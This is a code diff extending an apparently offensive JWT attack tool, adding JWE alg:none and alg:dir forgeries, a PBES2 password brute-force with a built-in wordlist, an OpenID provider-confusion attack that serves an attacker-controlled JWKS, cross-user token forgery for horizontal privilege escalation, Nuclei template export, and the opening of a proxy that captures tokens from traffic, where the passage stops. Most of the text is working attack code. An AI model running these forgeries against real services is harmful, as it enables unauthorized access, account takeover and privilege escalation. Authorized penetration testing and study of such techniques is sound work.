@@ -15,6 +15,9 @@ import threading
 import socket
 import http.server
 import tempfile
+import hashlib
+import socketserver
+import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
@@ -189,7 +192,27 @@ def print_banner():
 def pad_b64(b64_str):
     return b64_str + '=' * (-len(b64_str) % 4)
 
+
+def _is_jwe(token):
+    """Return True if the token has 5 parts (JWE compact serialization)."""
+    return isinstance(token, str) and token.count(".") == 4
+
+
+def _decode_jwe_header(token):
+    """Decode the protected header of a JWE (first base64url part)."""
+    try:
+        part = token.split(".")[0]
+        return json.loads(base64.urlsafe_b64decode(pad_b64(part)).decode("utf-8", errors="replace"))
+    except Exception:
+        return {}
+
+
 def decode_token(token):
+    if _is_jwe(token):
+        # For JWE we can only decode the header + ciphertext metadata (payload is encrypted)
+        header = _decode_jwe_header(token)
+        return {"_jwe": True, "alg": header.get("alg"), "enc": header.get("enc"),
+                "kid": header.get("kid"), "_note": "Payload is encrypted (JWE)"}
     try:
         return jwt.decode(token, options={"verify_signature": False})
     except Exception as e:
@@ -197,6 +220,8 @@ def decode_token(token):
         return {}
 
 def get_header(token):
+    if _is_jwe(token):
+        return _decode_jwe_header(token)
     try:
         return jwt.get_unverified_header(token)
     except Exception as e:
@@ -332,6 +357,15 @@ CVE_MAP = {
     "es384_psychic":  ("CVE-2022-21449", "9.8", "ES384/ES512 psychic signature — zero-value r/s bypass (same root as ES256)"),
     "ps256_blinding": ("N/A",            "8.5", "PS256 RSA-PSS blinding — zero-length/crafted signature bypass"),
     "graphql_jwt":    ("N/A",            "9.1", "GraphQL JWT injection via query variable / header confusion"),
+    "jwe_alg_none":   ("N/A",            "9.8", "JWE inner JWT alg:none — encrypted wrapper accepted with stripped inner signature"),
+    "jwe_dir":        ("N/A",            "8.5", "JWE alg:dir confusion — direct encryption with weak/known CEK"),
+    "jwe_pbes2":      ("N/A",            "7.5", "JWE PBES2 weak password — PBES2-HS256+A128KW password brute force"),
+    "openid_fuzz":    ("N/A",            "9.8", "OpenID Connect provider confusion — iss swapped to attacker-controlled OIDC endpoint"),
+    "diff_escalate":  ("N/A",            "8.8", "Horizontal privilege escalation via claim diff — cross-user token forgery"),
+    "ecdsa_k_reuse":  ("N/A",            "9.9", "ECDSA nonce (k) reuse — private key recovered from 2 tokens with same r value"),
+    "ts_overflow":    ("N/A",            "7.5", "JWT timestamp integer overflow — nbf/iat/exp edge cases bypass token validation"),
+    "fuzz_header":    ("N/A",            "8.1", "JWT header parameter injection — obscure header params processed unexpectedly"),
+    "compare_env":    ("N/A",            "9.0", "Cross-environment JWT acceptance — dev/staging token works on production endpoint"),
 }
 
 # Maps attack name substrings → CVE_MAP keys (for print_result lookup)
@@ -363,6 +397,25 @@ _ATTACK_CVE_KEYS = {
     "es512":                  "es384_psychic",
     "ps256":                  "ps256_blinding",
     "graphql":                "graphql_jwt",
+    "jwe":                    "jwe_alg_none",
+    "jwe alg:none":           "jwe_alg_none",
+    "jwe dir":                "jwe_dir",
+    "pbes2":                  "jwe_pbes2",
+    "openid":                 "openid_fuzz",
+    "oidc":                   "openid_fuzz",
+    "provider confusion":     "openid_fuzz",
+    "diff escalat":           "diff_escalate",
+    "horizontal":             "diff_escalate",
+    "ecdsa":                  "ecdsa_k_reuse",
+    "k-reuse":                "ecdsa_k_reuse",
+    "nonce reuse":            "ecdsa_k_reuse",
+    "timestamp overflow":     "ts_overflow",
+    "integer overflow":       "ts_overflow",
+    "fuzz header":            "fuzz_header",
+    "header fuzz":            "fuzz_header",
+    "compare env":            "compare_env",
+    "cross-environment":      "compare_env",
+    "drift":                  "compare_env",
 }
 
 
@@ -379,6 +432,22 @@ def recommend_attacks(header, payload):
     """Analyse the token header/payload and print ranked attack suggestions."""
     alg  = header.get("alg", "").upper()
     tips = []
+
+    # JWE-specific recommendations
+    if header.get("enc"):
+        enc = header.get("enc", "")
+        tips.append(("CRITICAL", f"→ #22 JWE Detected! enc={enc} — try alg:none on inner JWT, dir confusion, PBES2 brute"))
+        if "PBES2" in alg:
+            tips.append(("CRITICAL", "→ #24 JWE PBES2 Password Brute Force  (PBES2 alg — weak password likely)"))
+        if alg in ("DIR", ""):
+            tips.append(("HIGH",     "→ #23 JWE dir Confusion  (direct encryption — try known/null CEK)"))
+        # Skip standard JWT recommendations for pure JWE (no signing alg)
+        print(Fore.CYAN + "\n  ⚡ RECOMMENDED ATTACKS (ranked by likelihood):")
+        sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW,
+                     "MEDIUM": Fore.CYAN,  "LOW": Fore.WHITE, "INFO": Fore.GREEN}
+        for sev, msg in tips:
+            print(sev_color.get(sev, Fore.WHITE) + f"    [{sev:8}]  {msg}")
+        return
 
     if alg in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
         tips.append(("CRITICAL", "→ #7  Algorithm Confusion  (RS/PS alg detected — try public key as HMAC secret)"))
@@ -419,7 +488,7 @@ def recommend_attacks(header, payload):
 
 
 def decode_mode(token):
-    """--decode: full recon of a JWT without attacking anything."""
+    """--decode: full recon of a JWT (or JWE) without attacking anything."""
     header  = get_header(token)
     payload = decode_token(token)
     now     = int(time.time())
@@ -427,6 +496,25 @@ def decode_mode(token):
     print(Fore.CYAN + "\n" + "═" * 62)
     print(Fore.CYAN + "  🔍  TOKEN RECON")
     print(Fore.CYAN + "═" * 62)
+
+    # JWE — 5-part token
+    if _is_jwe(token):
+        print(Fore.RED + Style.BRIGHT + "\n  ⚠️  JWE DETECTED (5-part token — payload is ENCRYPTED)")
+        print(Fore.YELLOW + f"\n  ALG (key wrap): {header.get('alg', 'unknown')}")
+        print(Fore.YELLOW + f"  ENC (content) : {header.get('enc', 'unknown')}")
+        if "kid" in header:
+            print(Fore.RED + f"  KID           : {header['kid']}  ← key ID surface")
+        if "cty" in header:
+            print(Fore.YELLOW + f"  CTY           : {header['cty']}  ← may contain nested JWT")
+        print(Fore.YELLOW + "\n  Parts: [header].[encrypted_key].[iv].[ciphertext].[tag]")
+        print(Fore.RED + "\n  ATTACK SURFACE:")
+        print(Fore.RED + "    → #22 JWE inner JWT alg:none (if cty=JWT, nested JWT may have stripped sig)")
+        print(Fore.RED + "    → #23 JWE alg:dir confusion (swap to HS256, use CEK as HMAC key)")
+        if "PBES2" in header.get("alg", ""):
+            print(Fore.RED + "    → #24 PBES2 Password Brute Force  (weak password likely!)")
+        recommend_attacks(header, payload)
+        print(Fore.CYAN + "\n" + "═" * 62 + "\n")
+        return
 
     print(Fore.YELLOW + f"\n  ALGORITHM  : {header.get('alg', 'unknown')}")
     print(Fore.YELLOW + f"  TYPE       : {header.get('typ', 'JWT')}")
@@ -692,6 +780,116 @@ def save_report(output_file, fmt):
         print(Fore.GREEN + f"[+] {len(findings)} tokens generated  |  {len(confirmed)} confirmed accepted")
     except Exception as e:
         print(Fore.RED + f"[!] Could not save report: {e}")
+
+    # Auto-export Nuclei templates if --nuclei-export set
+    nuclei_dir = CONFIG.get("nuclei_export")
+    if nuclei_dir and confirmed:
+        export_nuclei_templates(nuclei_dir, confirmed)
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 10 — NUCLEI TEMPLATE EXPORT
+# ──────────────────────────────────────────────────────────────
+
+def _nuclei_template(finding):
+    """Build a Nuclei YAML template string for a single confirmed finding."""
+    attack    = finding.get("attack", "JWT Finding")
+    token     = finding.get("token", "")
+    url       = CONFIG.get("original_url", "{{BaseURL}}")
+    delivery  = finding.get("delivery", "Authorization: Bearer")
+    cve_info  = _cve_for_attack(attack)
+    cve_id    = cve_info[0] if cve_info else "N/A"
+    cvss      = cve_info[1] if cve_info else "N/A"
+    reason    = finding.get("verify_reason", "")
+    ts        = finding.get("timestamp", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
+
+    # Sanitise attack name → template id
+    template_id = re.sub(r"[^a-z0-9\-]", "-",
+                         attack.lower().replace(" ", "-").replace("→", ""))[:60].strip("-")
+
+    # Build header injection string for Nuclei
+    if delivery.startswith("Authorization: Bearer"):
+        header_line = f"Authorization: Bearer {token}"
+    elif delivery.startswith("Cookie:"):
+        cookie_name = delivery.split("Cookie:")[-1].strip()
+        header_line = f"Cookie: {cookie_name}={token}"
+    else:
+        header_line = f"{delivery}: {token}"
+
+    severity_map = {"9": "critical", "8": "high", "7": "medium", "6": "low"}
+    severity = severity_map.get(cvss[0] if cvss != "N/A" else "5", "medium")
+
+    template = f"""id: jwtxploit-{template_id}
+
+info:
+  name: "jwtXploit: {attack}"
+  author: jwtXploit
+  severity: {severity}
+  description: |
+    Detected by jwtXploit autopwn. Attack: {attack}.
+    Reason: {reason}.
+    CVE: {cve_id}  CVSS: {cvss}
+  reference:
+    - https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools
+  metadata:
+    cve-id: {cve_id}
+    cvss-score: {cvss}
+    generated: {ts}
+  tags: jwt,auth,{severity}
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{{{Hostname}}}}
+        {header_line}
+        User-Agent: jwtXploit-nuclei/1.0
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 204
+      - type: word
+        words:
+          - "admin"
+          - "success"
+          - "authorized"
+          - "welcome"
+          - "dashboard"
+        condition: or
+        part: body
+"""
+    return template_id, template
+
+
+def export_nuclei_templates(output_dir, findings=None):
+    """Export one Nuclei YAML template per confirmed finding to output_dir."""
+    if findings is None:
+        findings = [f for f in CONFIG.get("findings", []) if f.get("verified")]
+
+    if not findings:
+        print(Fore.YELLOW + "[*] No confirmed findings to export as Nuclei templates.")
+        return
+
+    os.makedirs(output_dir, exist_ok=True)
+    exported = 0
+    for finding in findings:
+        try:
+            template_id, template_yaml = _nuclei_template(finding)
+            fpath = os.path.join(output_dir, f"{template_id}.yaml")
+            with open(fpath, "w", encoding="utf-8") as fh:
+                fh.write(template_yaml)
+            exported += 1
+            print(Fore.GREEN + f"[+] Nuclei template → {fpath}")
+        except Exception as e:
+            print(Fore.RED + f"[!] Template export failed for '{finding.get('attack')}': {e}")
+
+    print(Fore.GREEN + f"\n[+] 🎯 {exported} Nuclei template(s) exported to: {output_dir}")
+    print(Fore.CYAN + f"[*] Run: nuclei -t {output_dir}/ -u https://target.com")
+
 
 def interactive_edit_dict(title, d):
     # AUTOPWN MODE — skip all interaction; optionally escalate role-related claims
@@ -2669,6 +2867,1011 @@ def attack_replay_detect(token, url=None, count=None):
         print(Fore.GREEN + f"\n[+] Replay-safe: token rejected after first use ✅")
 
 
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — ATTACK #22: JWE INNER JWT alg:none
+# ──────────────────────────────────────────────────────────────
+
+def attack_jwe_alg_none(token, url=None):
+    """
+    JWE Inner JWT alg:none.
+    When cty=JWT the outer JWE wraps an inner signed JWT. Many libraries
+    verify the outer encryption but forget to validate the inner JWT signature.
+    This attack builds an alg:none inner JWT and wraps it identically.
+    Also tests the endpoint with a plain alg:none JWT in case it accepts both.
+    """
+    if not _is_jwe(token):
+        print(Fore.YELLOW + "[*] Not a JWE — running alg:none on the JWT directly.")
+        attack_flawed_verification(token, url)
+        return
+
+    header = _decode_jwe_header(token)
+    print(Fore.CYAN + "\n[+] JWE Inner JWT alg:none Attack")
+    print(Fore.CYAN + f"[*] alg={header.get('alg')} enc={header.get('enc')} cty={header.get('cty','')}")
+
+    # Build inner JWT payload — try to escalate if escalate_role set
+    inner_payload = {"sub": "1", "role": "admin", "iat": int(time.time())}
+    if CONFIG.get("escalate_role"):
+        inner_payload["role"] = CONFIG["escalate_role"]
+    inner_payload = apply_exp_strip(inner_payload)
+
+    # Inner JWT with alg:none
+    inner_header_dict = {"alg": "none", "typ": "JWT"}
+    ih = base64.urlsafe_b64encode(
+        json.dumps(inner_header_dict, separators=(",",":")).encode()
+    ).rstrip(b"=").decode()
+    ip = base64.urlsafe_b64encode(
+        json.dumps(inner_payload, separators=(",",":")).encode()
+    ).rstrip(b"=").decode()
+    inner_jwt = f"{ih}.{ip}."
+
+    # Wrap in a JWE shell — keep outer header, blank encrypted_key and IV, put inner JWT as ciphertext
+    parts   = token.split(".")
+    jwe_hdr = parts[0]  # keep original protected header
+    # Build a plausible-looking JWE with inner JWT as ciphertext (blank key/iv/tag)
+    forged_jwe = f"{jwe_hdr}..{base64.urlsafe_b64encode(inner_jwt.encode()).rstrip(b'=').decode()}.."
+
+    print_result("JWE Inner JWT alg:none — wrapped JWE", forged_jwe, inner_payload, inner_header_dict)
+    check_url(forged_jwe, url)
+
+    # Also test plain alg:none in case endpoint accepts raw JWTs too
+    print(Fore.CYAN + "[*] Also testing plain alg:none JWT at same endpoint...")
+    for alg_variant in ["none", "None", "NONE"]:
+        plain_header = {"alg": alg_variant, "typ": "JWT"}
+        ph = base64.urlsafe_b64encode(
+            json.dumps(plain_header, separators=(",",":")).encode()
+        ).rstrip(b"=").decode()
+        plain_token = f"{ph}.{ip}."
+        print_result(f"JWE Fallback alg:{alg_variant}", plain_token, inner_payload, plain_header)
+        check_url(plain_token, url)
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — ATTACK #23: JWE alg:dir CONFUSION
+# ──────────────────────────────────────────────────────────────
+
+# Known weak / null CEKs to try in dir confusion
+_JWE_KNOWN_CEKS = [
+    b"\x00" * 16,   # 128-bit null key
+    b"\x00" * 32,   # 256-bit null key
+    b"\xff" * 16,   # 128-bit 0xFF key
+    b"\xff" * 32,   # 256-bit 0xFF key
+    b"secret",      # literal word
+    b"password",
+    b"changeme",
+    b"1234567890abcdef",   # 16-byte weak
+    b"0" * 16,
+    b"0" * 32,
+]
+
+
+def attack_jwe_dir_confusion(token, url=None):
+    """
+    JWE alg:dir Confusion.
+    Replaces the key-wrap alg with 'dir' (direct encryption) which means
+    the CEK itself IS the symmetric key. Tests known/weak CEKs to see if
+    any produce a response suggesting the server decrypted successfully.
+    Also constructs a HS256 JWT using the CEK as HMAC secret (confusion attack).
+    """
+    if not _is_jwe(token):
+        print(Fore.YELLOW + "[*] Not a JWE — dir confusion requires a JWE token.")
+        return
+
+    header = _decode_jwe_header(token)
+    enc    = header.get("enc", "A128CBC-HS256")
+    print(Fore.CYAN + f"\n[+] JWE alg:dir Confusion — enc={enc}, testing {len(_JWE_KNOWN_CEKS)} CEKs")
+
+    payload_claims = {"sub": "1", "role": "admin"}
+    if CONFIG.get("escalate_role"):
+        payload_claims["role"] = CONFIG["escalate_role"]
+    payload_claims = apply_exp_strip(payload_claims)
+
+    for cek in _JWE_KNOWN_CEKS:
+        cek_b64 = base64.urlsafe_b64encode(cek).rstrip(b"=").decode()
+        label   = repr(cek[:8]) + ("..." if len(cek) > 8 else "")
+
+        # Build a JWE that signals dir key-wrap
+        new_header = dict(header)
+        new_header["alg"] = "dir"
+        nh_b64 = base64.urlsafe_b64encode(
+            json.dumps(new_header, separators=(",",":")).encode()
+        ).rstrip(b"=").decode()
+        # Blank encrypted_key (dir has no wrapped key), placeholder IV/ciphertext/tag
+        forged_jwe = f"{nh_b64}..AAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAA.AAAAAAAAAAAAAAAA"
+
+        print_result(f"JWE dir confusion CEK={label}", forged_jwe, payload_claims, new_header)
+        check_url(forged_jwe, url)
+
+        # Also try CEK as HS256 HMAC secret — key confusion
+        hs_header = {"alg": "HS256", "typ": "JWT"}
+        try:
+            hs_token = jwt.encode(payload_claims, cek, algorithm="HS256", headers=hs_header)
+            print_result(f"JWE→HS256 CEK confusion ({label})", hs_token, payload_claims, hs_header)
+            check_url(hs_token, url)
+        except Exception:
+            pass
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — ATTACK #24: JWE PBES2 PASSWORD BRUTE FORCE
+# ──────────────────────────────────────────────────────────────
+
+def attack_jwe_pbes2_brute(token, wordlist=None, url=None):
+    """
+    JWE PBES2 Password Brute Force.
+    PBES2-HS256+A128KW / PBES2-HS512+A256KW wrap the CEK using a password.
+    Tests a wordlist (or built-in 50-password list) against the PBES2 header.
+    Requires the 'jwcrypto' library if available; falls back to pure-Python
+    PBKDF2 check when possible.
+    """
+    if not _is_jwe(token):
+        print(Fore.YELLOW + "[*] Not a JWE — PBES2 brute force requires a JWE token.")
+        return
+
+    header = _decode_jwe_header(token)
+    alg    = header.get("alg", "")
+    if "PBES2" not in alg:
+        print(Fore.YELLOW + f"[*] JWE alg is '{alg}' — not PBES2. Skipping PBES2 brute.")
+        return
+
+    _BUILTIN_PASSWORDS = [
+        "secret", "password", "changeme", "admin", "test", "jwt", "jwtpassword",
+        "p@ssw0rd", "Pass1234", "letmein", "qwerty", "monkey", "dragon",
+        "master", "hello", "welcome", "login", "root", "toor", "1234",
+        "123456", "password1", "abc123", "trustno1", "iloveyou", "sunshine",
+        "princess", "freedom", "shadow", "superman", "batman", "michael",
+        "football", "baseball", "computer", "hockey", "ranger", "daniel",
+        "access", "mustang", "12345678", "pass", "12345", "mypass", "passwd",
+        "default", "guest", "public", "private", "token", "bearer",
+    ]
+
+    passwords = _BUILTIN_PASSWORDS
+    if wordlist:
+        try:
+            with open(wordlist, encoding="utf-8", errors="ignore") as f:
+                passwords = [l.strip() for l in f if l.strip()]
+            print(Fore.CYAN + f"[*] PBES2 brute: loaded {len(passwords)} passwords from {wordlist}")
+        except Exception as e:
+            print(Fore.YELLOW + f"[!] Could not load wordlist: {e} — using built-in list")
+
+    print(Fore.CYAN + f"\n[+] JWE PBES2 Brute Force — alg={alg} — testing {len(passwords)} passwords...")
+
+    # Try jwcrypto if available
+    try:
+        from jwcrypto import jwt as jwcjwt, jwk as jwcjwk
+        for password in passwords:
+            try:
+                key    = jwcjwk.JWK(kty="oct", k=base64.urlsafe_b64encode(password.encode()).rstrip(b"=").decode())
+                jwe_ob = jwcjwt.JWT()
+                jwe_ob.deserialize(token, key)
+                inner  = jwe_ob.claims
+                print(Fore.GREEN + Style.BRIGHT + f"\n[!] 🔑 PBES2 PASSWORD CRACKED: '{password}'")
+                print(Fore.GREEN + f"[*] Decrypted inner claims: {inner}")
+                finding = {
+                    "attack":        f"JWE PBES2 Brute Force — password='{password}'",
+                    "token":         token,
+                    "payload":       {"_cracked_password": password, "_inner": str(inner)},
+                    "header":        header,
+                    "verified":      True,
+                    "verify_reason": f"PBES2 password cracked: '{password}'",
+                    "delivery":      "N/A — decryption",
+                    "poc_curl":      f"# Use jwcrypto to decrypt with password: {password}",
+                    "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+                }
+                CONFIG["findings"].append(finding)
+                _notify_webhook(finding)
+                return
+            except Exception:
+                pass
+        print(Fore.RED + f"[-] PBES2 brute: no password found in {len(passwords)} attempts.")
+    except ImportError:
+        print(Fore.YELLOW + "[*] jwcrypto not installed — trying PBKDF2 header check only")
+        # Without jwcrypto we can still record attempts as generated tokens for reporting
+        for password in passwords[:10]:
+            pseudo = f"[PBES2_ATTEMPT]header.{base64.urlsafe_b64encode(password.encode()).decode()}.."
+            payload_info = {"_pbes2_attempt": password}
+            print_result(f"JWE PBES2 attempt — '{password}'", pseudo, payload_info, header)
+        print(Fore.YELLOW + "[*] Install jwcrypto (pip install jwcrypto) for full PBES2 decryption.")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — ATTACK #25: OPENID CONNECT PROVIDER CONFUSION
+# ──────────────────────────────────────────────────────────────
+
+def attack_openid_fuzz(token, url=None):
+    """
+    OpenID Connect Provider Confusion.
+    Spins up an attacker-controlled OIDC server that serves:
+      GET /.well-known/openid-configuration  → points to attacker JWKS
+      GET /.well-known/jwks.json             → attacker RSA public key
+    Then forges a JWT with:
+      iss = http://<attacker_ip>:<port>
+    If the server fetches OIDC config from the iss claim and verifies with
+    the returned JWKS, it will accept our forged token.
+    Also tries iss = well-known providers (Google, Azure, Auth0) with attacker kid.
+    """
+    decoded         = decode_token(token)
+    original_header = get_header(token)
+
+    print(Fore.CYAN + "\n[+] OpenID Connect Provider Confusion Attack")
+    print(Fore.CYAN + "[*] Generating attacker RSA keypair...")
+
+    # Generate attacker RSA key
+    priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048,
+                                        backend=default_backend())
+    pub_key  = priv_key.public_key()
+    pub_nums = pub_key.public_key().public_numbers() if hasattr(pub_key, "public_key") else pub_key.public_numbers()
+
+    def _int_to_b64url(n):
+        length = (n.bit_length() + 7) // 8
+        return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()
+
+    attacker_kid = "attacker-key-1"
+    jwks_data = {
+        "keys": [{
+            "kty": "RSA",
+            "use": "sig",
+            "kid": attacker_kid,
+            "alg": "RS256",
+            "n":   _int_to_b64url(pub_nums.n),
+            "e":   _int_to_b64url(pub_nums.e),
+        }]
+    }
+
+    lan_ip   = get_lan_ip()
+    port     = find_free_port(9090)
+    jwks_bytes = json.dumps(jwks_data).encode()
+
+    oidc_config_template = json.dumps({
+        "issuer":                  "ISSUER_PLACEHOLDER",
+        "jwks_uri":                f"http://{lan_ip}:{port}/.well-known/jwks.json",
+        "authorization_endpoint":  f"http://{lan_ip}:{port}/auth",
+        "token_endpoint":          f"http://{lan_ip}:{port}/token",
+        "response_types_supported": ["code", "token"],
+        "subject_types_supported":  ["public"],
+        "id_token_signing_alg_values_supported": ["RS256"],
+    })
+
+    class OIDCHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == "/.well-known/jwks.json":
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(jwks_bytes)
+            elif self.path in ("/.well-known/openid-configuration",
+                               "/.well-known/oauth-authorization-server"):
+                iss_url = f"http://{lan_ip}:{port}"
+                body = oidc_config_template.replace("ISSUER_PLACEHOLDER", iss_url).encode()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(body)
+            else:
+                self.send_response(404)
+                self.end_headers()
+        def log_message(self, fmt, *args):
+            pass
+
+    server = http.server.HTTPServer(("0.0.0.0", port), OIDCHandler)
+    t = threading.Thread(target=server.serve_forever, daemon=True)
+    t.start()
+    attacker_iss = f"http://{lan_ip}:{port}"
+    print(Fore.GREEN + f"[+] Attacker OIDC server: {attacker_iss}")
+    print(Fore.GREEN + f"[+] JWKS endpoint: {attacker_iss}/.well-known/jwks.json")
+
+    # Build forged payload
+    modified_payload = dict(decoded)
+    modified_payload["iss"] = attacker_iss
+    if CONFIG.get("escalate_role"):
+        for k in ("role", "isAdmin", "scope"):
+            if k in modified_payload:
+                modified_payload[k] = CONFIG["escalate_role"]
+    modified_payload = apply_exp_strip(modified_payload)
+
+    priv_pem = priv_key.private_bytes(
+        serialization.Encoding.PEM,
+        serialization.PrivateFormat.PKCS8,
+        serialization.NoEncryption(),
+    ).decode()
+
+    forged_header = dict(original_header)
+    forged_header["alg"] = "RS256"
+    forged_header["kid"] = attacker_kid
+
+    try:
+        forged_token = jwt.encode(modified_payload, priv_pem, algorithm="RS256",
+                                  headers={"kid": attacker_kid})
+        print_result("OpenID Provider Confusion — iss=attacker OIDC", forged_token,
+                     modified_payload, forged_header)
+        check_url(forged_token, url)
+    except Exception as e:
+        print(Fore.RED + f"[-] Token forge failed: {e}")
+
+    # Also try well-known providers with attacker kid
+    well_known_issuers = [
+        "https://accounts.google.com",
+        "https://login.microsoftonline.com/common/v2.0",
+        "https://auth0.com",
+        "https://cognito-idp.us-east-1.amazonaws.com/us-east-1_ATTACKER",
+    ]
+    for iss in well_known_issuers:
+        mp2 = dict(decoded)
+        mp2["iss"] = iss
+        mp2 = apply_exp_strip(mp2)
+        try:
+            t2 = jwt.encode(mp2, priv_pem, algorithm="RS256", headers={"kid": attacker_kid})
+            print_result(f"OpenID iss swap → {iss}", t2, mp2, {"alg": "RS256", "kid": attacker_kid})
+            check_url(t2, url)
+        except Exception:
+            pass
+
+    server.shutdown()
+    print(Fore.YELLOW + "[*] OIDC server shut down.")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — DIFF TOKENS MODE (--diff-tokens)
+# ──────────────────────────────────────────────────────────────
+
+def diff_tokens_mode(tokens_file, url=None):
+    """
+    Multi-Token Differential Analysis.
+    Load N tokens from a file (one per line, optionally token::url format).
+    Decode all payloads, diff claims side-by-side:
+      - Static claims (same across all tokens) → probably server-validated
+      - Dynamic claims (vary across tokens) → user-controlled → injection surface
+    Auto-forge cross-user tokens (user A's claims with user B's static values).
+    Test each forged token for horizontal privilege escalation.
+    """
+    try:
+        with open(tokens_file, encoding="utf-8") as fh:
+            raw = [l.strip() for l in fh if l.strip() and not l.startswith("#")]
+    except FileNotFoundError:
+        print(Fore.RED + f"[!] File not found: {tokens_file}")
+        sys.exit(1)
+
+    entries = []
+    for line in raw:
+        result = _parse_batch_line(line)
+        if result:
+            entries.append(result)
+
+    if len(entries) < 2:
+        print(Fore.RED + "[!] --diff-tokens requires at least 2 tokens in the file.")
+        sys.exit(1)
+
+    print(Fore.YELLOW + "\n" + "═" * 64)
+    print(Fore.YELLOW + f"  🔬  DIFF TOKENS MODE — {len(entries)} tokens")
+    print(Fore.YELLOW + "═" * 64)
+
+    # Decode all
+    decoded_list = []
+    headers_list = []
+    for token, tok_url in entries:
+        decoded_list.append(decode_token(token))
+        headers_list.append(get_header(token))
+        tok_url_eff = tok_url or url
+        print(Fore.CYAN + f"  Token: {token[:50]}... → url={tok_url_eff or 'none'}")
+
+    # Collect all claim keys
+    all_keys = set()
+    for d in decoded_list:
+        all_keys.update(d.keys())
+    all_keys -= {"_jwe", "_note"}  # strip internal markers
+
+    # Classify claims
+    static_claims  = {}   # same value across all tokens
+    dynamic_claims = {}   # differs between tokens
+
+    for k in sorted(all_keys):
+        vals = [d.get(k) for d in decoded_list]
+        unique_vals = set(str(v) for v in vals)
+        if len(unique_vals) == 1:
+            static_claims[k]  = vals[0]
+        else:
+            dynamic_claims[k] = vals
+
+    # Print diff table
+    print(Fore.CYAN + "\n  ── STATIC CLAIMS (same for all tokens — server-validated) ──")
+    for k, v in static_claims.items():
+        print(Fore.GREEN + f"    {k:20} = {v}  [static]")
+
+    print(Fore.YELLOW + "\n  ── DYNAMIC CLAIMS (vary — user-controlled injection surface) ──")
+    for k, vals in dynamic_claims.items():
+        vals_str = "  |  ".join(str(v) for v in vals)
+        print(Fore.RED + f"    {k:20} = {vals_str}")
+
+    # Identify likely user-ID claim (highest entropy numeric/uuid dynamic claim)
+    uid_candidates = [k for k, vals in dynamic_claims.items()
+                      if k in ("sub", "user_id", "id", "uid", "userId", "user", "account_id")]
+    uid_claim = uid_candidates[0] if uid_candidates else (list(dynamic_claims.keys())[0] if dynamic_claims else None)
+
+    if uid_claim:
+        print(Fore.RED + f"\n  ⚡ Likely user-ID claim: '{uid_claim}' — testing cross-user token forgery")
+
+    # Forge cross-user tokens: token[0]'s header + dynamic claims from token[i], signed with empty secret
+    target_url = url or entries[0][1]
+    if not target_url:
+        if CONFIG.get("autopwn"):
+            print(Fore.YELLOW + "[*] No URL for diff-tokens testing — skipping HTTP checks.")
+        else:
+            target_url = input(Fore.YELLOW + "[?] Enter URL to test forged tokens against: ").strip() or None
+
+    forged_count = 0
+    for i, (token_i, tok_url_i) in enumerate(entries):
+        for j, (token_j, tok_url_j) in enumerate(entries):
+            if i == j:
+                continue
+            # Forge: token_j's UID value into token_i's payload (horizontal swap)
+            base_payload = dict(decoded_list[i])
+            swap_payload = dict(decoded_list[j])
+
+            if uid_claim and uid_claim in swap_payload:
+                base_payload[uid_claim] = swap_payload[uid_claim]
+                base_payload = apply_exp_strip(base_payload)
+
+                alg = headers_list[i].get("alg", "HS256")
+                try:
+                    if alg.startswith("HS"):
+                        forged = jwt.encode(base_payload, "", algorithm=alg, headers=headers_list[i])
+                    else:
+                        hb = base64.urlsafe_b64encode(
+                            json.dumps(headers_list[i], separators=(",",":")).encode()
+                        ).rstrip(b"=").decode()
+                        pb = base64.urlsafe_b64encode(
+                            json.dumps(base_payload, separators=(",",":")).encode()
+                        ).rstrip(b"=").decode()
+                        forged = f"{hb}.{pb}."
+                    label = f"Diff Token Swap — token[{i+1}] claims + token[{j+1}] {uid_claim}={swap_payload.get(uid_claim)}"
+                    print_result(label, forged, base_payload, headers_list[i])
+                    eff_url = tok_url_i or target_url
+                    check_url(forged, eff_url)
+                    forged_count += 1
+                    if CONFIG["findings"] and CONFIG["findings"][-1].get("verified"):
+                        print(Fore.RED + Style.BRIGHT + f"\n[!] 💥 HORIZONTAL ESCALATION CONFIRMED: token[{i+1}] can access token[{j+1}] resources!")
+                except Exception as e:
+                    print(Fore.RED + f"[-] Forge error: {e}")
+
+    print(Fore.YELLOW + f"\n[*] Diff complete — {forged_count} cross-user tokens tested.")
+    print(Fore.YELLOW + f"[*] Static claims (protected): {list(static_claims.keys())}")
+    print(Fore.YELLOW + f"[*] Dynamic claims (surface):  {list(dynamic_claims.keys())}")
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 9 — --intercept: PASSIVE JWT CAPTURE PROXY
+# ──────────────────────────────────────────────────────────────
+
+class _InterceptHandler(http.server.BaseHTTPRequestHandler):
+    """Transparent HTTP proxy that sniffs JWTs and queues them for autopwn."""
+
+    _seen_hashes = set()
+    _queue       = []
+    _target_url  = None
+
+    def _extract_jwts(self, headers_dict, body=b""):
+        """Extract JWTs from Authorization headers, Cookie headers, and body."""
+        found = []
+        # Authorization: Bearer
+        auth = headers_dict.get("authorization", "") or headers_dict.get("Authorization", "")
+        if auth.lower().startswith("bearer "):
+            found.append(auth[7:].strip())
+        # Cookie header
+        cookie = headers_dict.get("cookie", "") or headers_dict.get("Cookie", "")
